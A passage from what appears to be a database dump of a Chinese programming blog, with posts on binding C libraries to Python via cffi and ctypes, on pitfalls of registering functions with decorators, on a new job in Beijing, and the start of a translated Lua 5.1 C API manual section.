ffi.verify(sources=[''foo.c'']) 指定。 verify 接受的参数和 setuptools/distutils 的 Extension 类接受的参数是兼容的。\n如果目标代码不是 ANSI C 而是 C++ 的，暴露给 cffi 的接口需要包在 extern "C" {} 内。\n优点：\n\n跨解释器兼容，同时支持 CPython 2.x/3.x 和 PyPy；\n开发和部署都非常简单，编译过程由 cffi 库默默完成。\n\n缺点：\n\n由于是运行时编译，所以即使做了安装源的二进制打包，部署环境还是 必须 安装编译器和 foobar-devel 库；\n同样由于运行时编译，所以对于频繁运行而每次运行时间又特别短的小脚本来说， verify 的执行有些不“低碳”（对于驻守进程的应用则可以忽略这个开销，因为 verify 只在首次调时编译）。\n\n\n\n基于 boost-python 的封装\n实现例子：tclip 的例子就没有了。有一个 tesseract 的 Python Binding 实现 tesserwrap， 早期 使用了这个方法。\n据说性能捉急，坑又多多。所以 tesserwrap 现在也迁移到 ctypes 了。这里就不详述了。\n\n\n\n做出选择\n我个人来说最推崇的方法是 cffi/ctypes，理由是“跨解释器”。我认为作为一个库实现，对 PyPy 的支持重要程度不亚于对 Python 3.x 的支持。\n我现在发起的开源 Python 库一律对 CPython 2.7、CPython 3.3 和 PyPy latest stable release 提供 CI 保证和维护支持。因为我认为作为维护者，不应该让自己的库成为用户选择优秀解释器的阻碍。cffi/ctypes 很完美地符合了这个要求。\n目前为止，我了解的还有 Wand （ImageMagick 的 binding）和现行版本的 tesserwrap （Tesseract 的 binding）使用了 cffi/ctypes ；此外如果要在 PyPy 下使用 PostgreSQL，选择之一也是 psycopg2-ctypes 驱动。\n', NULL, NULL, NULL),
(50, 'https://blog.tonyseek.com/post/how-to-register-python-function-by-decorator/', '用装饰器注册 Python 函数', '<p>注册回调函数应该是开发中很常见的一种行为。这在 Python 中通常通过装饰器来实现，看起来比较漂亮：</p>\n<figure class="code"><figcaption><span>flaskr.py</span></figcaption><div class="highlight"><pre> <span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">home</span><span class="p">():</span>\n     <span class="k">return</span> <span class="s">&quot;It works.&quot;</span>\n</pre></div>\n</figure><p>但是这种用法常常带来一种隐藏的“惊讶”，比如说：</p>\n\n<figure class="code"><figcaption><span>admin_menu.py</span></figcaption><div class="highlight"><pre> <span class="nd">@permission</span><span class="p">([</span><span class="s">&quot;manager&quot;</span><span class="p">,</span> <span class="s">&quot;developer&quot;</span><span class="p">])</span>\n <span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/admin&quot;</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">admin_menu</span><span class="p">():</span>\n     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">&quot;admin/menu.html&quot;</span><span class="p">)</span>\n</pre></div>\n</figure><p>这个 <tt class="docutils literal">&#64;permission</tt> 根本不会生效，因为在它装饰 <tt class="docutils literal">admin_menu</tt> 之前，<tt class="docutils literal">admin_menu</tt> 就已经被注册到 <tt class="docutils literal">app</tt> 里了。最终我们执行的是未经过装饰的函数。</p>\n<p>类似的陷阱还有可能出现在“猴子补丁”使用的场景。比如下面这段代码将一系列 <tt class="docutils literal">filter</tt> 注册到一个对象中：</p>\n<figure class="code"><figcaption><span>filter_manager.py</span></figcaption><div class="highlight"><pre> <span class="k">class</span> <span class="nc">FilterManager</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n     <span class="sd">&quot;&quot;&quot;The filter registry center.&quot;&quot;&quot;</span>\n\n     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n         <span class="bp">self</span><span class="o">.</span><span class="n">_filters</span> <span class="o">=</span> <span class="p">{}</span>\n\n     <span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n         <span class="k">def</span> <span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>\n             <span class="bp">self</span><span class="o">.</span><span class="n">_filters</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">func</span>\n             <span class="k">return</span> <span class="n">func</span>\n         <span class="k">return</span> <span class="n">decorator</span>\n\n     <span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">type_name</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>\n         <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_filters</span><span class="p">[</span><span class="n">type_name</span><span class="p">](</span><span class="n">value</span><span class="p">)</span>\n\n <span class="n">filter_manager</span> <span class="o">=</span> <span class="n">FilterManager</span><span class="p">()</span>\n\n <span class="nd">@filter_manager.register</span><span class="p">(</span><span class="s">&quot;datetime&quot;</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">datetime_filter</span><span class="p">(</span><span class="n">dt</span><span class="p">):</span>\n     <span class="n">dt</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">&quot;%Y-%m-</span><span class="si">%d</span><span class="s"> %H:%M&quot;</span><span class="p">)</span>\n</pre></div>\n</figure><p>看起来似乎很漂亮，但是如果我在写单元测试的时候，希望用一个 Stub 来取代 <tt class="docutils literal">datetime_filter</tt> ，就会小小惊讶一下：</p>\n<figure class="code"><figcaption><span>test_filter_manager.py</span></figcaption><div class="highlight"><pre> <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>\n <span class="kn">from</span> <span class="nn">mock</span> <span class="kn">import</span> <span class="n">patch</span>\n <span class="kn">from</span> <span class="nn">filter_manager</span> <span class="kn">import</span> <span class="n">filter_manager</span><span class="p">,</span> <span class="n">datetime_filter</span>\n\n\n <span class="nd">@patch</span><span class="p">(</span><span class="s">&quot;filter_manager.datetime_filter&quot;</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">test_datetime_filter</span><span class="p">():</span>\n     <span class="n">filter_manager</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="s">&quot;datetime&quot;</span><span class="p">,</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">())</span>\n     <span class="k">assert</span> <span class="n">datetime_filter</span><span class="o">.</span><span class="n">called</span>\n</pre></div>\n</figure><p>说到底还是用装饰器注册函数，不是 <strong>Lazy Binding</strong> 的。</p>\n<p>这是我个人感觉 Python 的装饰器使用中比较违反直觉的一个地方。虽然装饰器这种看上去很像“声明”的语法很酷，却也很 <a class="reference external" href="http://www.python.org/dev/peps/pep-0020/">implicit</a> 。当然因为装饰器的这种用法实在太流行，很多 Python 开发者已经具备了绕过这个陷阱的技能了（Orz，小白和非小白的区别之一）。但是我还是觉得这种东西需要开发者用经验去绕过的，并不符合我比较认同的最小惊讶原则。</p>\n<p>所以…… 我可能还是更喜欢用 Qualified Name 来引用要注册的函数，以实现真正的 Lazy Binding：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">def</span> <span class="nf">import_object</span><span class="p">(</span><span class="n">qualname</span><span class="p">):</span>\n    <span class="k">try</span><span class="p">:</span>\n        <span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">import_string</span>\n    <span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>\n        <span class="kn">from</span> <span class="nn">importlib</span> <span class="kn">import</span> <span class="n">import_module</span>\n        <span class="n">module_name</span><span class="p">,</span> <span class="n">object_name</span> <span class="o">=</span> <span class="n">qualname</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>\n        <span class="n">module</span> <span class="o">=</span> <span class="n">import_module</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>\n        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">object_name</span><span class="p">)</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="k">return</span> <span class="n">import_string</span><span class="p">(</span><span class="n">qualname</span><span class="p">)</span>\n\n\n<span class="k">def</span> <span class="nf">get_qualname</span><span class="p">(</span><span class="n">o</span><span class="p">):</span>\n    <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">o</span><span class="p">,</span> <span class="s">&quot;__qualname__&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">.</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">o</span><span class="o">.</span><span class="n">__module__</span><span class="p">,</span> <span class="n">o</span><span class="o">.</span><span class="n">__name__</span><span class="p">))</span>\n\n\n<span class="k">class</span> <span class="nc">FilterManager</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;The filter registry center.&quot;&quot;&quot;</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">_filters_qualname</span> <span class="o">=</span> <span class="p">{}</span>\n\n    <span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n        <span class="k">def</span> <span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">_filters_qualname</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_qualname</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>\n            <span class="k">return</span> <span class="n">func</span>\n        <span class="k">return</span> <span class="n">decorator</span>\n\n    <span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">type_name</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>\n        <span class="n">qualname</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_filters_qualname</span><span class="p">[</span><span class="n">type_name</span><span class="p">]</span>\n        <span class="n">func</span> <span class="o">=</span> <span class="n">import_object</span><span class="p">(</span><span class="n">qualname</span><span class="p">)</span>\n        <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>\n</pre></div>\n</figure>', '2014-11-06 23:43:08', 6, '2013-08-13 10:28:00', '2013-08-13 10:28:00', 0, '[["filter", 0.6291982896263157], ["def", 0.44043880273842095], ["name", 0.4089788882571052], ["self", 0.3775189737757894], ["datetime", 0.3460590592944736], ["return", 0.3460590592944736], ["qualname", 0.3460590592944736], ["import", 0.3460590592944736], ["manager", 0.2831392303318421], ["__", 0.2516793158505263], ["func", 0.2516793158505263], ["module", 0.22021940136921048], ["filters", 0.1887594868878947], ["._", 0.1887594868878947], ["admin", 0.1887594868878947], ["object", 0.1887594868878947], ["menu", 0.15729957240657894], ["\\u88c5\\u9970", 0.13150982679523684], ["decorator", 0.12583965792526314], ["py", 0.12583965792526314]]', NULL, NULL, '注册回调函数应该是开发中很常见的一种行为。这在 Python 中通常通过装饰器来实现，看起来比较漂亮：\nflaskr.py @app.route("/")\n def home():\n     return "It works."\n\n但是这种用法常常带来一种隐藏的“惊讶”，比如说：\n\nadmin_menu.py @permission(["manager", "developer"])\n @app.route("/admin")\n def admin_menu():\n     return render_template("admin/menu.html")\n\n这个 @permission 根本不会生效，因为在它装饰 admin_menu 之前，admin_menu 就已经被注册到 app 里了。最终我们执行的是未经过装饰的函数。\n类似的陷阱还有可能出现在“猴子补丁”使用的场景。比如下面这段代码将一系列 filter 注册到一个对象中：\nfilter_manager.py class FilterManager(object):\n     """The filter registry center."""\n\n     def __init__(self):\n         self._filters = {}\n\n     def register(self, name):\n         def decorator(func):\n             self._filters[name] = func\n             return func\n         return decorator\n\n     def filter(self, type_name, value):\n         return self._filters[type_name](value)\n\n filter_manager = FilterManager()\n\n @filter_manager.register("datetime")\n def datetime_filter(dt):\n     dt.strftime("%Y-%m-%d %H:%M")\n\n看起来似乎很漂亮，但是如果我在写单元测试的时候，希望用一个 Stub 来取代 datetime_filter ，就会小小惊讶一下：\ntest_filter_manager.py from datetime import datetime\n from mock import patch\n from filter_manager import filter_manager, datetime_filter\n\n\n @patch("filter_manager.datetime_filter")\n def test_datetime_filter():\n     filter_manager.filter("datetime", datetime.utcnow())\n     assert datetime_filter.called\n\n说到底还是用装饰器注册函数，不是 Lazy Binding 的。\n这是我个人感觉 Python 的装饰器使用中比较违反直觉的一个地方。虽然装饰器这种看上去很像“声明”的语法很酷，却也很 implicit 。当然因为装饰器的这种用法实在太流行，很多 Python 开发者已经具备了绕过这个陷阱的技能了（Orz，小白和非小白的区别之一）。但是我还是觉得这种东西需要开发者用经验去绕过的，并不符合我比较认同的最小惊讶原则。\n所以…… 我可能还是更喜欢用 Qualified Name 来引用要注册的函数，以实现真正的 Lazy Binding：\ndef import_object(qualname):\n    try:\n        from werkzeug.utils import import_string\n    except ImportError:\n        from importlib import import_module\n        module_name, object_name = qualname.rsplit(".", 1)\n        module = import_module(module_name)\n        return getattr(module, object_name)\n    else:\n        return import_string(qualname)\n\n\ndef get_qualname(o):\n    return getattr(o, "__qualname__", "%s.%s" % (o.__module__, o.__name__))\n\n\nclass FilterManager(object):\n    """The filter registry center."""\n\n    def __init__(self):\n        self._filters_qualname = {}\n\n    def register(self, name):\n        def decorator(func):\n            self._filters_qualname[name] = get_qualname(func)\n            return func\n        return decorator\n\n    def filter(self, type_name, value):\n        qualname = self._filters_qualname[type_name]\n        func = import_object(qualname)\n        return func(value)\n\n', NULL, NULL, NULL),
(51, 'https://blog.tonyseek.com/post/another-life-in-beijing/', '新的生活在北京开始', '<p>转眼间，来到北京已经两周，在豆瓣入职也已经一周了。各种混乱开始慢慢趋于有序，毕业时的失落感也开始慢慢淡化。一种生活的结束伴随着另一种生活的开始，对一座城市告别也伴随着对另一座城市问好。</p>\n\n<div class="section" id="id2">\n<h2>关于工作</h2>\n<p>我虽是新入职，去年的实习却让我在圈子中已不像新人。</p>\n<p>公司安排了一直到月底的培训课程，现在已经过了一周。感觉技术类的培训帮助不是特别大，实际工作中遇到的很多问题都是具体的、细节的。对于概括性质的介绍，去年实习的时候已经了解了一些，不了解的我也更多是和同事私下沟通了解，而非通过大教室式的课\n程。</p>\n<p>倒是产品线和部门的介绍很有点意思，其中平台组的介绍是我的偶像大神洪教授来讲解。平台组本身在我心目中就很有魅力，经过教授介绍就更加让人着迷了。可惜感觉自己真的太浅薄太浅薄，这两年要好好学习，争取打怪升级。</p>\n<p>还有，清风老师还是一如既往过尽千帆的萌。我为自己也是纯洁的白羊座感到骄傲。嗯忽略这段吧。</p>\n</div>\n<div class="section" id="id3">\n<h2>关于作息</h2>\n<p>似乎作息混乱已经成了个人印象标签的一部分，但是我真心希望能有规律的作息。毕业前夕琐事多，自己因为心态原因做很多事情效率也不高，因而常常熬夜通宵，昼夜混乱。现在新的生活已经开始，我希望能在半年内变得有序，因此开始尝试早睡早起。当然我的早睡是指两点以前睡，早起是指能抢到公司的包子。</p>\n<p>我觉得好的作息习惯不一定是晚上十点睡早上六点起吧，关键还在于规律。如果一直保持晚上一点钟睡，早上八点钟起，然后中午再打盹半个小时，那么精神状态应该也能很好。生活习惯是有节奏感的，在睡眠时间充足的情况下，每天的规律的节奏感会给人动力。不幸的是，我的工作性质必然会导致这种节奏不定期被打乱，所以我的另一个想法是练习出强大的“恢复”能力，在外界激励消除后迅速找回以前的节奏。这个也是我这半年的目标之一吧。</p>\n</div>\n<div class="section" id="id4">\n<h2>关于圈子</h2>\n<p>我妈妈经常给我洗脑：不要太宅了，人脉是很重要的社会资源。</p>\n<p>其实人脉除了是资源，还是生活的一部分。自古知己难求，我觉得不仅仅是知己，身边的每一个人和我们的相遇都是多重偶然叠加的结果，应该珍惜这种相遇。</p>\n<p>所以我会听妈妈的话，不要太宅了，积极参加小默桑组织的各种约饭约电影约[X]活动。</p>\n<p>不约P。</p>\n</div>\n<div class="section" id="id5">\n<h2>关于厨房</h2>\n<p><a class="reference external" href="http://www.douban.com/group/icook/">立志学好做饭</a> 。</p>\n<p>已经买了电磁炉、锅和竹锅铲，并且今天达成了新成就——正餐不下楼吃，在家煮面条。</p>\n<p>合租的四人似乎都不是很擅长下厨房。</p>\n<p>委座似乎要买电饭煲了，希望以后周末我们可以自己在家做饭。</p>\n<p>因为某人，我一定要在明年的这个时候之前学好做双皮奶。</p>\n</div>\n<div class="section" id="id7">\n<h2>关于幸福</h2>\n<p>幸福似乎挺简单的，从容、怀有希望，就会感到幸福。当然我只是目测。</p>\n<p>我现在的希望就是能融入到这座城市，然后在明年的这个时候迎接另一个人的到来。</p>\n<p>原来十多年怎么过来的似乎一点印象都没有了，现在的我已经无法想象没有 <a class="reference external" href="http://blog.lttxzmj.com">某人</a> 的生活。</p>\n<p><em>能写代码</em> 和 <em>得到某人的爱</em> 这两件事，达成一件就已经很幸福了。二者兼得，很知足。</p>\n</div>\n<div class="section" id="id9">\n<h2>结语</h2>\n<p>都一点半了，睡觉去。</p>\n</div>', '2014-11-06 23:43:08', 6, '2013-07-21 16:30:00', '2013-07-21 16:30:00', 0, '[["\\u4f5c\\u606f", 0.11289436238746736], ["\\u5df2\\u7ecf", 0.0803784277043342], ["\\u5e78\\u798f", 0.07110291316971279], ["\\u67d0\\u4eba", 0.07087713358793732], ["\\u4f3c\\u4e4e", 0.06825986170718015], ["\\u5e0c\\u671b", 0.06795480776997388], ["\\u5173\\u4e8e", 0.06500635895208877], ["\\u592a\\u5b85", 0.06242698434934726], ["\\u751f\\u6d3b", 0.06049428763798956], ["\\u4ecb\\u7ecd", 0.057801983660365534], ["\\u6df7\\u4e71", 0.05427422230221932], ["\\u8282\\u594f\\u611f", 0.053457524834464754], ["\\u5b66\\u597d", 0.05248318564125327], ["\\u5f00\\u59cb", 0.050196176345169714], ["\\u6d45\\u8584", 0.04864600612694517], ["\\u77e5\\u5df1", 0.04785628826934726], ["\\u89c4\\u5f8b", 0.04734484136216711], ["\\u5b9e\\u4e60", 0.045989177290704966], ["\\u5708\\u5b50", 0.0438399274989034], ["\\u76f8\\u9047", 0.042803630168772845]]', NULL, NULL, '转眼间，来到北京已经两周，在豆瓣入职也已经一周了。各种混乱开始慢慢趋于有序，毕业时的失落感也开始慢慢淡化。一种生活的结束伴随着另一种生活的开始，对一座城市告别也伴随着对另一座城市问好。\n\n\n关于工作\n我虽是新入职，去年的实习却让我在圈子中已不像新人。\n公司安排了一直到月底的培训课程，现在已经过了一周。感觉技术类的培训帮助不是特别大，实际工作中遇到的很多问题都是具体的、细节的。对于概括性质的介绍，去年实习的时候已经了解了一些，不了解的我也更多是和同事私下沟通了解，而非通过大教室式的课\n程。\n倒是产品线和部门的介绍很有点意思，其中平台组的介绍是我的偶像大神洪教授来讲解。平台组本身在我心目中就很有魅力，经过教授介绍就更加让人着迷了。可惜感觉自己真的太浅薄太浅薄，这两年要好好学习，争取打怪升级。\n还有，清风老师还是一如既往过尽千帆的萌。我为自己也是纯洁的白羊座感到骄傲。嗯忽略这段吧。\n\n\n关于作息\n似乎作息混乱已经成了个人印象标签的一部分，但是我真心希望能有规律的作息。毕业前夕琐事多，自己因为心态原因做很多事情效率也不高，因而常常熬夜通宵，昼夜混乱。现在新的生活已经开始，我希望能在半年内变得有序，因此开始尝试早睡早起。当然我的早睡是指两点以前睡，早起是指能抢到公司的包子。\n我觉得好的作息习惯不一定是晚上十点睡早上六点起吧，关键还在于规律。如果一直保持晚上一点钟睡，早上八点钟起，然后中午再打盹半个小时，那么精神状态应该也能很好。生活习惯是有节奏感的，在睡眠时间充足的情况下，每天的规律的节奏感会给人动力。不幸的是，我的工作性质必然会导致这种节奏不定期被打乱，所以我的另一个想法是练习出强大的“恢复”能力，在外界激励消除后迅速找回以前的节奏。这个也是我这半年的目标之一吧。\n\n\n关于圈子\n我妈妈经常给我洗脑：不要太宅了，人脉是很重要的社会资源。\n其实人脉除了是资源，还是生活的一部分。自古知己难求，我觉得不仅仅是知己，身边的每一个人和我们的相遇都是多重偶然叠加的结果，应该珍惜这种相遇。\n所以我会听妈妈的话，不要太宅了，积极参加小默桑组织的各种约饭约电影约[X]活动。\n不约P。\n\n\n关于厨房\n立志学好做饭 。\n已经买了电磁炉、锅和竹锅铲，并且今天达成了新成就——正餐不下楼吃，在家煮面条。\n合租的四人似乎都不是很擅长下厨房。\n委座似乎要买电饭煲了，希望以后周末我们可以自己在家做饭。\n因为某人，我一定要在明年的这个时候之前学好做双皮奶。\n\n\n关于幸福\n幸福似乎挺简单的，从容、怀有希望，就会感到幸福。当然我只是目测。\n我现在的希望就是能融入到这座城市，然后在明年的这个时候迎接另一个人的到来。\n原来十多年怎么过来的似乎一点印象都没有了，现在的我已经无法想象没有 某人 的生活。\n能写代码 和 得到某人的爱 这两件事，达成一件就已经很幸福了。二者兼得，很知足。\n\n\n结语\n都一点半了，睡觉去。\n', NULL, NULL, NULL),
(52, 'https://blog.tonyseek.com/post/the-application-program-interface-of-lua/', '[翻译] Lua 应用程序编程接口', '<p><img alt="知识共享署名-非商业性使用-相同方式共享 3.0 许可协议" src="https://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" /></p>\n<p>本文翻译采用 <a class="reference external" href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 3.0 许可协议</a> 进行许可。</p>\n<p>本文翻译节选自 <a class="reference external" href="http://www.lua.org/manual/5.1/manual.html#3">Lua 5.1 Reference Manual</a> ，只包含了描述部分，未包含 API 函数文档。</p>\n\n<div class="section" id="id2">\n<h2>概述</h2>\n<p>这部分描述了 Lua 的 C 语言绑定 API，这是一个 C 语言函数集合，用来提供宿主程序和 Lua 之见的信息交换。所有 API 函数和关联的类型、常量都被声明在头文件 <tt class="docutils literal">lua.h</tt> 里。</p>\n<p>即使我们使用了“函数”这个术语，许多 API 中的接口仍然以宏的方式提供。所有这样的宏只会精确地将每个参数使用一次（除了第一个参数，第一个参数始终为 Lua State），并且不会产生任何隐藏的副作用。</p>\n<p>几乎在所有的 C 语言库中，Lua API 函数都不会检查它们收到参数的有效性和一致性。然而，你可以通过修改 <tt class="docutils literal">luaconf.h</tt> 中的宏定义 <tt class="docutils literal">luai_apicheck</tt> 来改变这个行为。</p>\n</div>\n<div class="section" id="id3">\n<h2>状态栈</h2>\n<p><strong>译者注：本文中，带有双引号的“栈”特别指代 Lua State 状态栈。</strong></p>\n<p>Lua 使用一个虚拟的“栈”来和 C 语言之间传值和取值。每个栈中的元素都表示一个 Lua 值（nil 空值、number 数值型、string 字符串，诸如此类）。</p>\n<p>无论何时，Lua 调用 C 语言时，被调用函数会获得一个新的“栈”，它和前一个“栈”以及 C 语言函数的活动栈相互独立。这个“栈”初始化的时候包含了任何传入 C 语言函数的参数，同时 C 语言函数也在这个“栈”上推入值作为调用者的返回值。详见 <tt class="docutils literal">lua_CFunction</tt> API 的文档。</p>\n<p>为了方便，大多数 API 中的查询操作都不会遵循严格的栈访问规则（指严格的先进后出顺序访问，译者注）。相反，调用者可以通过索引引用“栈”上任何位置的元素：一个正数的索引代表“栈”上的绝对位置（从 1 开始）；一个负数的索引代表相对“栈”顶的位移位置。更明确来说，如果一个“栈”有 n 个元素，那么索引 1 代表“栈”上的第一个元素（也即第一个被推入栈中的元素）（即栈底，译者注），索引 -1 却代表最后一个元素（也即栈顶元素），索引 -n 代表第一个元素（即栈底，译者注）。如果一个所有的值在 1 到栈顶之间（也即 <tt class="docutils literal">1 ≤ abs(index) ≤ top</tt> ），我们就说这个索引是有效的。</p>\n</div>\n<div class="section" id="id4">\n<h2>状态栈大小</h2>\n<p>当你和 Lua API 交互时，你作为开发者有责任自己对一致性问题提供保证。往细里说，你有责任控制“栈”不要溢出。你可以使用 C 语言函数 <tt class="docutils literal">lua_checkstack</tt> 来检视“栈”的大小。</p>\n<p>无论何时 Lua 调用 C 语言，都能确保“栈”中有 <tt class="docutils literal">LUA_MINSTACK</tt> （API 中的宏定义，译者注）个位置可供使用。 <tt class="docutils literal">LUA_MINSTACK</tt> 的定义是 20，所以一般情况下你不需要担心“栈”的大小不够你的代码循环推入元素。</p>\n<p>大多数查询函数接受去获取有效“栈”空间中的任何值，也即通过 <tt class="docutils literal">lua_checkstack</tt> 检查“栈”的最大大小。这样的索引被称为“可接受索引”。更具有普遍适用意义地，我们给可接受索引一个定义，如下：</p>\n<figure class="code"><div class="highlight"><pre><span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">abs</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">top</span><span class="p">)</span> <span class="o">||</span>\n<span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">index</span> <span class="o">&lt;=</span> <span class="n">stackspace</span><span class="p">)</span>\n</pre></div>\n</figure><p>注意， <tt class="docutils literal">0</tt> 在任何时候都不是一个可接受索引。</p>\n</div>\n<div class="section" id="id5">\n<h2>伪索引</h2>\n<p>无需额外注意，所有函数都接受被称为“伪索引”的值作为有效的索引。伪索引表示一些可被 C 语言中 Lua API 函数接受，但却不在“栈”中的 Lua 值。伪索引常常被用来访问线程的环境、函数的环境、注册表以及 C 语言函数中的“上值”（upvalue，函数式编程中指闭包函数引用了的外部作用域变量，译者注）（参考 3.4 节）。</p>\n<p>线程环境（全局变量存活的地方）始终位于伪索引 <tt class="docutils literal">LUA_GLOBALSINDEX</tt> ，正在运行的 C 语言函数始终位于伪索引 <tt class="docutils literal">LUA_ENVIRONINDEX</tt> 。</p>\n<p>如果需要访问和修改全局变量的值，你需要对环境“表”（Lua 中一种类似关联数组的数据结构，译者注）使用常规的表操作。举个例子，访问全局变量，只需要：</p>\n<figure class="code"><div class="highlight"><pre><span class="n">lua_getfield</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">LUA_GLOBALSINDEX</span><span class="p">,</span> <span class="n">varname</span><span class="p">);</span>\n</pre></div>\n</figure></div>\n<div class="section" id="c">\n<h2>C 语言闭包</h2>\n<p>当一个 C 语言函数被创建出来，就有可能将它和某些值关联起来，从而创建了一个 C 语言的闭包（并非编译原理或离散数学中的闭包，这里特指函数式编程的“词法闭包”，译者注）；这些值被称之为“上值”（upvalues），无论绑定的函数在何时被调用，它们都能保证是可访问的。参考 <tt class="docutils literal">lua_pushcclosure</tt> 函数 API 文档。</p>\n<p>无论何时，一个 C 语言函数被调用，它的上值都位于一个特殊的伪索引上。这个伪索引由 <tt class="docutils literal">lua_upvalueindex</tt> 宏提供。第一个关联到函数的值位于 <tt class="docutils literal">lua_upvalueindex(1)</tt> 位置，依此类推。任何对 <tt class="docutils literal">lua_upvalueindex(n)</tt> 的访问，n 总是大于当前函数中上值的数量（但不会大于 256），提供一个可被接受（但无效）的特殊索引。</p>\n</div>\n<div class="section" id="id6">\n<h2>注册表</h2>\n<p>Lua 提供了一个注册表，一个预定义的表，可以被任何 C 语言代码使用，以便于储存人呢和需要储存的 Lua 值。这个表始终位于伪索引 <tt class="docutils literal">LUA_REGISTRYINDEX</tt> 之上。任何 C 语言库都能将数据存储到这个表中，但存储者应该要小心地选择键名，以和其他库所使用的不同，避免冲突。典型来说，你应该选择一个包含库名的字符串，或者一个内存地址位于你自己的库中的 C 对象所封装的“用户数据”（Lua 对 C 语言指针的一种封装，译者注），来作为你的键名。</p>\n<p>注册表中，整型的键名被引用机制所使用，这是 auxiliary 库（Lua API 的一套上层封装工具集，译者注）所实现的。所以不应该将整型键名用作其他用途。</p>\n</div>\n<div class="section" id="id7">\n<h2>C 语言方面的错误处理</h2>\n<p>在内部，Lua 使用 C 语言的 <tt class="docutils literal">longjmp</tt> 机制来处理错误。（如果你使用 C++，你也可以使用 C++ 异常，详见 <tt class="docutils literal">luaconf.h</tt> ） 当 Lua 面对任何错误（例如内存分配错误、类型错误、语法错误以及运行时错误）它会将其抛出——也就是做一次跳出（long jump）。在保护环境中，Lua 使用 <tt class="docutils literal">setjmp</tt> 来设置一个恢复指针；从任何错误中都会跳出到最近激活的恢复指针。</p>\n<p>大多数 API 函数都能抛出一个错误，例如遇到了内存分配失败。本文档为每一个函数明确声明了可能抛出的错误。</p>\n<p>在 C 语言函数中，你可以调用 <tt class="docutils literal">lua_error</tt> 来抛出一个错误。</p>\n</div>', '2014-11-06 23:43:08', 6, '2013-05-28 08:55:00', '2013-05-28 08:55:00', 0, '[["Lua", 0.34868071883458335], ["\\u7d22\\u5f15", 0.28372535690675005], ["\\u51fd\\u6570", 0.26564781642675], ["API", 0.21584996880236113], ["\\u8bed\\u8a00", 0.19688950584058335], ["lua", 0.16603843754027778], ["\\u8bd1\\u8005", 0.13291589321791666], ["LUA", 0.09962306252416667], ["\\u4e00\\u4e2a", 0.0978316309767361], ["\\u5143\\u7d20", 0.0855455083785], ["\\u95ed\\u5305", 0.08301921877013889], ["index", 0.08301921877013889], ["\\u4f7f\\u7528", 0.08154430452259721], ["\\u6ce8\\u518c\\u8868", 0.07722598695555556], ["\\u9519\\u8bef", 0.072134967612], ["\\u4efb\\u4f55", 0.07061896883583332], ["\\u8bbf\\u95ee", 0.07024164029497221], ["\\u8c03\\u7528", 0.05858920727048611], ["\\u952e\\u540d", 0.057919490216666675], ["\\u6587\\u6863", 0.055492525814166666]]', NULL, NULL, '\n本文翻译采用 知识共享署名-非商业性使用-相同方式共享 3.0 许可协议 进行许可。\n本文翻译节选自 Lua 5.1 Reference Manual ，只包含了描述部分，未包含 API 函数文档。\n\n\n概述\n这部分描述了 Lua 的 C 语言绑定 API，这是一个 C 语言函数集合，用来提供宿主程序和 Lua 